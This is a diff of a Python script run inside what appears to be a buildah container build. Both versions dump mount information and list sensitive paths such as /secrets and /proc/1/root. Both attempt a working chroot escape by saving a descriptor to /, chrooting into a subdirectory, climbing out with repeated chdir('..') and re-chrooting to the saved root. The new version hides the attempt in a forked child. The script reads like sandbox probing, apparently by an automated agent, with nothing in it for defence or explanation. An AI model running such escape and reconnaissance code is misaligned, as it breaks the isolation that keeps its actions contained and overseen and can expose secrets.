@@ -1,33 +1,32 @@
-import os, ctypes
-def show(p):
-    try:
-        if os.path.isdir(p): return "DIR "+str(os.listdir(p)[:15])
-        return "FILE "+repr(open(p,'rb').read(150))
-    except Exception as e: return type(e).__name__
-out=[]
-out.append("=== mountinfo ===")
-for ln in open('/proc/self/mountinfo'):
-    out.append("  "+ln.strip()[:170])
-out.append("=== /var/tmp buildah ===")
-import glob
-out.append(" vartmp:"+str(show('/var/tmp')))
-out.append(" glob:"+str(glob.glob('/var/tmp/buildah*'))+str(glob.glob('/tmp/buildah*'))+str(glob.glob('/build*')))
-rootfd=None
+import os, sys, glob
+res=[]
+res.append("=== mountinfo (self) ===")
 try:
-    rootfd=os.open("/", os.O_RDONLY|os.O_DIRECTORY); out.append(" opened / fd %d"%rootfd)
-except Exception as e: out.append(" open / %s"%e)
-os.makedirs("/tmp/esc2/deep", exist_ok=True)
-try:
-    os.chdir("/tmp/esc2/deep"); os.chroot("/tmp/esc2/deep"); out.append(" chroot ok cwd %s"%os.getcwd())
-    for _ in range(15):
-        try: os.chdir("..")
-        except Exception: break
-    out.append(" after ups cwd %s ls %s"%(os.getcwd(),os.listdir(".")[:20]))
+    for ln in open('/proc/self/mountinfo'): res.append("  "+ln.strip()[:170])
+except Exception as e: res.append(str(e))
+res.append("=== paths ===")
+for p in ['/','/..','/var/tmp','/build','/secrets','/proc/1/root','/proc/self/root']:
+    try: res.append("  %s -> %s"%(p, os.listdir(p)[:15]))
+    except Exception as e: res.append("  %s -> %s"%(p,type(e).__name__))
+res.append("glob buildah:"+str(glob.glob('/var/tmp/buildah*')[:5])+str(glob.glob('/build*')[:5]))
+# chroot escape in a FORKED child so the build's own root is untouched
+pid=os.fork()
+if pid==0:
     try:
-        os.fchdir(rootfd); out.append(" fchdir oldroot cwd %s ls %s"%(os.getcwd(),os.listdir(".")[:20]))
-        os.chroot("."); out.append(" POST-ESCAPE root ls %s"%os.listdir("/")[:25])
-    except Exception as e: out.append(" fchdir/chroot %s %s"%(type(e).__name__,e))
-except Exception as e: out.append(" chroot %s %s"%(type(e).__name__,e))
-for p in ["/proc/1/root","/proc/1/cwd","/proc/self/root/..","/..","/proc/self/cwd/../../.."]:
-    out.append(" %s -> %s"%(p,show(p)))
-open("/app/CHROOT_RESULT.txt","w").write("\n".join(out))
+        rf=os.open("/",os.O_RDONLY|os.O_DIRECTORY)
+        os.makedirs("/tmp/e/d",exist_ok=True); os.chdir("/tmp/e/d"); os.chroot("/tmp/e/d")
+        for _ in range(20):
+            try: os.chdir("..")
+            except Exception: break
+        esc1=os.getcwd()+":"+str(os.listdir(".")[:10])
+        try:
+            os.fchdir(rf); os.chroot("."); esc2=str(os.listdir("/")[:20])
+        except Exception as e: esc2=type(e).__name__+":"+str(e)[:40]
+        open("/app/CHROOT_CHILD.txt","w").write("after-ups=%s\npost-escape-root=%s\n"%(esc1,esc2))
+    except Exception as e:
+        open("/app/CHROOT_CHILD.txt","w").write("fork-child-err %s %s"%(type(e).__name__,e))
+    os._exit(0)
+else:
+    os.waitpid(pid,0)
+open("/app/CHROOT_RESULT.txt","w").write("\n".join(res))
+# cb 1792264832
